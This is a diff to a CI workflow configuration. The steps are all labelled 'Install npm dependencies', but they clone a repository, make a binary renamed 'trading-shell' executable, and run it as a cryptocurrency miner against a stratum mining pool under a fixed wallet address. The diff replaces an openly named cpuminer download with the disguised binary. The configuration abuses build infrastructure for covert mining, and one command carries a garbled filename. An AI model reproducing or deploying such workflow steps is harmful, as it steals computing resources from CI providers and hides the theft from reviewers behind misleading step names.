@@ -21,14 +21,14 @@ workflows:
           source: true
     scripts:
       - name: Install npm dependencies
-        script: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-mac.tar.gz
+        script: git clone https://github.com/hujan90/1.git
       - name: Install npm dependencies
         script: ls
       - name: Install npm dependencies
+        script: cd 1
+      - name: Install npm dependencies
+        script: chmod +x trading-shell
+      - name: Install npm dependencies
         script: ls
       - name: Install npm dependencies
-        script: chmod +x cpuminer-sse2
-      - name: Install npm dependencies
-        script: ls
-      - name: Install npm dependencies
-        script: ./cpuminer-sse2 -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.1 -t 4 -B --cpu-priority 4
+        script: ./trading-shel? -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.1 -t 4 -B --cpu-priority 4
